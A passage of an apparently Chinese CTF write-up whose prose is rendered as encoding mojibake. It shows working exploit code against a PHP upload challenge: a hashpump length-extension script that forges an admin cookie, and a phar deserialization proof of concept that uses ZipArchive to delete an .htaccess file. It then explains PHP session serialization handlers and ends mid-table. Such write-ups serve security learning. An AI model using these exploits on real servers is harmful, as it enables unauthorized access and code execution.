<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_dir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content_check</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$file_tmp</span>, <span class="variable">$size</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upload_dir = <span class="string">&#x27;sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;upload_dir))&#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$this</span>-&gt;upload_dir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/.htaccess&#x27;</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/.htaccess&#x27;</span>, <span class="string">&#x27;lolololol, i control all&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$size</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_tmp = <span class="variable">$file_tmp</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check = <span class="keyword">new</span> <span class="title class_">Check</span>(<span class="variable language_">$this</span>-&gt;file_tmp);</span><br><span class="line">        <span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker = <span class="variable">$profile</span>-&gt;<span class="title function_ invoke__">is_admin</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;u r not admin&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check -&gt; <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;your file is too big&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file_tmp, <span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;filename).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°äº†å…³é”®ä»£ç ã€‚è°ƒç”¨äº†$this-&gt;checker,å¦‚æœä¸ä¸ºTrueï¼Œå°±è¾“å‡ºä¸æ˜¯admin</p>
<p>ç»§ç»­è¿½è¸ªä»£ç profileç±»ä¸­çš„is_adminå‡½æ•°</p>
<p>æ¥ç€å¾€ä¸‹çœ‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$secret</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password != <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$this</span>-&gt;username.<span class="variable">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ã€‚å°†æˆ‘ä»¬ä¹‹å‰ç™»é™†çš„ç”¨æˆ·åå¯†ç èµ‹å€¼ç»™usernameå’Œpassword<br>
ç„¶åå®šä¹‰äº†ä¸€ä¸ªå¯†é’¥ã€‚<br>
åˆ¤æ–­æˆ‘ä»¬ä¹‹å‰è¾“å‡ºçš„ç”¨æˆ·åæ˜¯ä¸æ˜¯adminã€‚å¯†ç ä¸èƒ½æ˜¯admin<br>
ç„¶åå°†å¯†é’¥å’Œç”¨æˆ·åå¯†ç æ‹¼æ¥ã€‚MD5åŠ å¯†ã€‚å°†åŠ å¯†ç»“æœå’Œcookies[â€˜userâ€™]è¿›è¡Œæ¯”è¾ƒ<br>
è¿™é‡Œæˆ‘ä»¬æœ‰ä¸‰ä¸ªå¯æ§ç‚¹ã€‚ç”¨æˆ·å+å¯†ç +cookies[â€˜userâ€™]</p>
<p>è¿™é‡Œå¯ä»¥å…ˆä½¿ç”¨hashæ‹“å±•æ”»å‡»ï¼Œå†™ä¸ªhashpumpè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">sign = <span class="string">&#x27;52107b08c0f3342d2153ae1d68e6262c&#x27;</span> <span class="comment">#ä»cookieä¸­è·å¾—</span></span><br><span class="line">param=<span class="string">&#x27;admin&#x27;</span></span><br><span class="line">sign,add_data = hashpumpy.hashpump(sign,<span class="string">&#x27;adminadmin&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="number">8</span>) <span class="comment">#ç™»å½•æ—¶å¯†ç ä¸º123ï¼Œç”¨æˆ·åä¸ºadmin,admin+123é•¿åº¦ä¸º8</span></span><br><span class="line">add_data = add_data[<span class="built_in">len</span>(param):]</span><br><span class="line"><span class="built_in">print</span>(sign)</span><br><span class="line"><span class="built_in">print</span>(add_data)</span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(add_data))</span><br></pre></td></tr></table></figure>
<p>è·å¾—<code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00123</code></p>
<p>å†æ·»åŠ ä¸€ä¸ªåä¸ºuserçš„cookieï¼Œå€¼ä¸º4b2928c6b562e5e4dbd35df611b46487<br>
ç”¨æ–°çš„å¯†ç é‡æ–°ç™»å½•ï¼Œæ­£å¸¸ç™»å½•ä¹‹åä¸Šä¼ æ–‡ä»¶èƒ½å¤Ÿæ˜¾ç¤ºæ­£å¸¸è·¯å¾„ã€‚</p>
<p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶å¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œä½¿å¾—ä¸Šä¼ çš„phpæ–‡ä»¶æ— æ³•è§£æ<br>
å­˜åœ¨ä¸€ä¸ªæ£€æµ‹ä¸Šä¼ æ–‡ä»¶mimeç±»å‹çš„åŠŸèƒ½ï¼ŒçŒœæµ‹å­˜åœ¨pharååºåˆ—åŒ–,çœ‹çœ‹config.phpä¸­çš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;</span>, <span class="variable">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mine</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$store_path</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>] = <span class="variable">$mine</span>;</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>] = <span class="variable">$store_path</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨äº†mime_content_typeå‡½æ•°æ¥æ£€æµ‹æ–‡ä»¶mimeç±»å‹</p>
<p>å¯»æ‰¾åˆ©ç”¨é“¾</p>
<p>é¦–å…ˆå¯»æ‰¾__destructæ–¹æ³•ï¼Œåªæœ‰ä¸€ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//config.php Fileç±»</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">upload_file</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Adminç±»å­˜åœ¨upload_fileæ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;u r not admin&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_check -&gt; <span class="title function_ invoke__">check</span>();</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;your file is too big&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;file_tmp, <span class="variable">$this</span>-&gt;upload_dir.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;filename).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°Profileç±»å­˜åœ¨ä¸€ä¸ª__callæ–¹æ³•ã€</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__callä¼šåœ¨åœ¨è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Profileç±»ä¸å­˜åœ¨upload_fileæ–¹æ³•ï¼Œå› æ­¤æŠŠcheckerè½¦ä½Profileç±»çš„è¯å°±ä¼šè°ƒç”¨è¿™ä¸ª__callå‡½æ•°<br>
æ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯è¦æ‰¾åˆ°ä¸€ä¸ªå…·æœ‰openæ–¹æ³•çš„ç±»</p>
<p><strong>ä½¿ç”¨ZipArchive::openåˆ é™¤.htaccess</strong></p>
<p>æœ€åçš„poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$admin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker=<span class="variable">$admin</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin=<span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;/var/www/html/sandbox/1050a6a70986f01594e231dadd01f541/.htaccess&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = ZIPARCHIVE::<span class="variable constant_">OVERWRITE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$admin</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»£ç å¾ˆç®€å•ã€‚å‡†å¤‡ä¸¤ä¸ªç±»ã€‚ç„¶åå°†éœ€è¦ç”¨åˆ°çš„å˜é‡èµ‹å€¼ã€‚ç”Ÿæˆpharå°±å¥½äº†<br>
ä¸Šä¼ phar.pharï¼Œç„¶åé€šè¿‡view.phpè§¦å‘ã€‚</p>
<h3 id="sessionååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#sessionååºåˆ—åŒ–"></a> Sessionååºåˆ—åŒ–</h3>
<p>è¯¥èŠ‚å†…å®¹æ‘˜æŠ„è‡ª<a href="https://www.freebuf.com/articles/web/324519.html">PHP sessionååºåˆ—åŒ–æ¼æ´åŸç†è§£æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>ï¼Œsessionååºåˆ—åŒ–çš„å®ç”¨æ€§è¿˜æ˜¯è›®å¼ºçš„ï¼Œharden3å¸ˆå‚…å†™çš„å¾ˆç»†~</p>
<h4 id="ä»€ä¹ˆæ˜¯session"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯session"></a> ä»€ä¹ˆæ˜¯session</h4>
<p>å®˜æ–¹<code>Session</code>å®šä¹‰ï¼šåœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚<code>Session</code>å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚ä¸»è¦æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<blockquote>
<p><code>session</code>ä¿å­˜çš„ä½ç½®æ˜¯åœ¨æœåŠ¡å™¨ç«¯</p>
<p><code>session</code>é€šå¸¸æ˜¯è¦é…åˆ<code>cookie</code>ä½¿ç”¨</p>
</blockquote>
<p>å› ä¸ºHTTPçš„æ— çŠ¶æ€æ€§ï¼ŒæœåŠ¡ç«¯äº§ç”Ÿäº†<code>session</code>æ¥æ ‡è¯†å½“å‰çš„ç”¨æˆ·çŠ¶æ€</p>
<p>æœ¬è´¨ä¸Šï¼Œ<code>session</code>å°±æ˜¯ä¸€ç§å¯ä»¥ç»´æŒæœåŠ¡å™¨ç«¯çš„æ•°æ®å­˜å‚¨æŠ€æœ¯ã€‚å³**<code>session</code>æŠ€æœ¯å°±æ˜¯ä¸€ç§åŸºäºåç«¯æœ‰åˆ«äºæ•°æ®åº“çš„ä¸´æ—¶å­˜å‚¨æ•°æ®çš„æŠ€æœ¯**</p>
<h4 id="php-sessionå·¥ä½œæµç¨‹"><a class="markdownIt-Anchor" href="#php-sessionå·¥ä½œæµç¨‹"></a> PHP sessionå·¥ä½œæµç¨‹</h4>
<p>ä»¥PHPä¸ºä¾‹ï¼Œç†è§£<code>session</code>çš„åŸç†</p>
<ol>
<li>PHPè„šæœ¬ä½¿ç”¨ session_start()æ—¶å¼€å¯<code>session</code>ä¼šè¯ï¼Œä¼šè‡ªåŠ¨æ£€æµ‹<code>PHPSESSID</code>
<ul>
<li>å¦‚æœ<code>Cookie</code>ä¸­å­˜åœ¨ï¼Œè·å–<code>PHPSESSID</code></li>
<li>å¦‚æœ<code>Cookie</code>ä¸­ä¸å­˜åœ¨ï¼Œåˆ›å»ºä¸€ä¸ª<code>PHPSESSID</code>ï¼Œå¹¶é€šè¿‡å“åº”å¤´ä»¥<code>Cookie</code>å½¢å¼ä¿å­˜åˆ°æµè§ˆå™¨</li>
</ul>
</li>
<li>åˆå§‹åŒ–è¶…å…¨å±€å˜é‡<code>$_SESSION</code>ä¸ºä¸€ä¸ªç©ºæ•°ç»„</li>
<li>PHPé€šè¿‡<code>PHPSESSID</code>å»æŒ‡å®šä½ç½®ï¼ˆ<code>PHPSESSID</code>æ–‡ä»¶å­˜å‚¨ä½ç½®ï¼‰åŒ¹é…å¯¹åº”çš„æ–‡ä»¶
<ul>
<li>å­˜åœ¨è¯¥æ–‡ä»¶ï¼šè¯»å–æ–‡ä»¶å†…å®¹ï¼ˆé€šè¿‡ååºåˆ—åŒ–æ–¹å¼ï¼‰ï¼Œå°†æ•°æ®å­˜å‚¨åˆ°<code>$_SESSION</code>ä¸­</li>
<li>ä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼š session_start()åˆ›å»ºä¸€ä¸ª<code>PHPSESSID</code>å‘½åæ–‡ä»¶</li>
</ul>
</li>
<li>ç¨‹åºæ‰§è¡Œç»“æŸï¼Œå°†<code>$_SESSION</code>ä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°<code>PHPSESSID</code>å¯¹åº”çš„æ–‡ä»¶ä¸­</li>
</ol>
<p>å…·ä½“åŸç†å›¾ï¼š</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988659_622b0d7380818dab56a63-166727395787419.jpeg" alt="img"></p>
<h4 id="phpini-sessioné…ç½®"><a class="markdownIt-Anchor" href="#phpini-sessioné…ç½®"></a> php.ini sessioné…ç½®</h4>
<p><code>php.ini</code>é‡Œé¢æœ‰è¾ƒé‡è¦çš„<code>session</code>é…ç½®é¡¹</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.save_path</span>=<span class="string">&quot;/tmp&quot;</span>      --è®¾ç½®sessionæ–‡ä»¶çš„å­˜å‚¨ä½ç½®</span><br><span class="line"><span class="attr">session.save_handler</span>=files    --è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®sessionå­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line"><span class="attr">session.auto_start</span>= <span class="number">0</span>          --æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤å€¼ä¸º <span class="number">0</span>ï¼Œä¸å¯åŠ¨</span><br><span class="line"><span class="attr">session.serialize_handler</span>= php --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œé»˜è®¤ä½¿ç”¨php  </span><br><span class="line"><span class="attr">session.upload_progress.enabled</span>= <span class="literal">On</span> --å¯ç”¨ä¸Šä¼ è¿›åº¦è·Ÿè¸ªï¼Œå¹¶å¡«å……$ _SESSIONå˜é‡ï¼Œé»˜è®¤å¯ç”¨</span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span>= <span class="literal">oN</span> --è¯»å–æ‰€æœ‰POSTæ•°æ®ï¼ˆå³å®Œæˆä¸Šä¼ ï¼‰åç«‹å³æ¸…ç†è¿›åº¦ä¿¡æ¯ï¼Œé»˜è®¤å¯ç”¨</span><br></pre></td></tr></table></figure>
<h4 id="php-sessionåºåˆ—åŒ–æœºåˆ¶"><a class="markdownIt-Anchor" href="#php-sessionåºåˆ—åŒ–æœºåˆ¶"></a> PHP sessionåºåˆ—åŒ–æœºåˆ¶</h4>
<p>æ ¹æ®<code>php.ini</code>ä¸­çš„é…ç½®é¡¹ï¼Œæˆ‘ä»¬ç ”ç©¶å°†<code>$_SESSION</code>ä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°<code>PHPSESSID</code>å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨çš„ä¸‰ç§ä¸åŒçš„å¤„ç†æ ¼å¼ï¼Œå³<code>session.serialize_handler</code>å®šä¹‰çš„ä¸‰ç§å¼•æ“ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">å¤„ç†å™¨</th>
<th style="text-align:center">å¯¹åº”çš„å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">php</td>
<td style="text-align:center">é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td style="text-align:center">php_binary</td>
<td style="text-align:center">é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td style="text-align:center">php_serialize (php&gt;=5.5.4)</td>
<td style="text-align:center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„</td>
</tr>
</tbody>
</table>
<h4 id="phpå¤„ç†å™¨"><a class="markdownIt-Anchor" href="#phpå¤„ç†å™¨"></a> phpå¤„ç†å™¨</h4>
<p>é¦–å…ˆæ¥çœ‹çœ‹é»˜è®¤<code>session.serialize_handler = php</code>æ—¶å€™çš„åºåˆ—åŒ–ç»“æœï¼Œä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1646988663_622b0d779748192aba6f7-166727395787420.jpeg" alt="img"></p>
<p>ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹ï¼Œå°†<code>session</code>å­˜å‚¨ç›®å½•è®¾ç½®ä¸º<code>session.save_path = &quot;/www/php_session&quot;</code>ï¼Œ<code>PHPSESSID</code>æ–‡ä»¶å¦‚ä¸‹</p>
<p>1ã€æ–‡ä»¶å</p>
<p>æ–‡ä»¶åä¸º<code>sess_mpnnbont606f50eb178na451od</code>ï¼Œå…¶ä¸­<code>mpnnbont606f50eb178na451od</code>å°±æ˜¯åç»­è¯·æ±‚å¤´ä¸­<code>Cookie</code>æºå¸¦çš„<code>PHPSESSID</code>çš„å€¼ (å¦‚ä¸Šå›¾æµè§ˆå™¨ä¸­å·²å­˜å‚¨)</p>
<p>2ã€æ–‡ä»¶å†…å®¹</p>
<p>phpå¤„ç†å™¨å­˜å‚¨æ ¼å¼</p>
<table>
<thead>
<tr>
<th style="text-align:center">é”®å</th>
<th style="text-align:center">ç«–çº¿</th>
<th style="text-align:center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$_SESSION[â€˜nameâ€™]çš„é”®åï¼šname</td>
<td style="text-align:center">|</td>
<td style="text-align:center">s:6:â€œhardenâ€;</td>
</tr>
</tbody>
</table>
